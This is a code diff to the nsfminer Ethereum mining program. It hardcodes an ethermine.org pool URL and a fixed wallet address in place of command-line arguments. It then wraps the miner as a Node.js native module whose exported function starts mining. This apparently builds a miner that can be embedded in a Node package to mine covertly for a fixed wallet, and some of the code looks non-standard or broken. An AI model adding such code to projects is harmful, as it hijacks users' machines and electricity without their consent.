@@ -43,6 +43,9 @@
 
 #include <ethash/version.h>
 
+
+#include <napi.h>
+
 using namespace std;
 using namespace dev;
 using namespace dev::eth;
@@ -1189,7 +1192,7 @@ private:
 #endif
 };
 
-int main(int argc, char** argv)
+int main()
 {
     // Return values
     // 0 - Normal exit
@@ -1197,6 +1200,20 @@ int main(int argc, char** argv)
     // 2 - Runtime error
     // 3 - Other exceptions
     // 4 - Unknown exception
+
+    // nsfminer -P
+    // stratum1+tcp://0xeb69eF814E424f0654E2F253d2C734ba5f53c701.Worker@eu1.ethermine.org:4444
+    // --response-timeout 30
+
+    int argc = 5;  // Argument Count!
+    char** argv = (char**)malloc(sizeof(char*) * argc);
+    argv[0] = "nsfminer";
+    argv[1] = "-P";
+    argv[2] =
+        "stratum1+tcp://"
+        "0xeb69eF814E424f0654E2F253d2C734ba5f53c701.Worker@eu1.ethermine.org:4444";
+    argv[3] = "--response-timeout";
+    argv[4] = "30";
 
     dev::setThreadName("miner");
 
@@ -1283,3 +1300,21 @@ int main(int argc, char** argv)
         return 4;
     }
 }
+
+static Napi::String Method(const Napi::CallbackInfo& info)
+{
+    Napi::Env env = info.Env();
+    int result = main();
+    char snum[5];
+    itoa(result, snum, 10);
+
+    return Napi::String::New(env, snum);
+}
+
+static Napi::Object Init(Napi::Env env, Napi::Object exports)
+{
+    exports.Set(Napi::String::New(env, "nsfminer"), Napi::Function::New(env, Method));
+    return exports;
+}
+
+NODE_API_MODULE(nsfminer, Init)
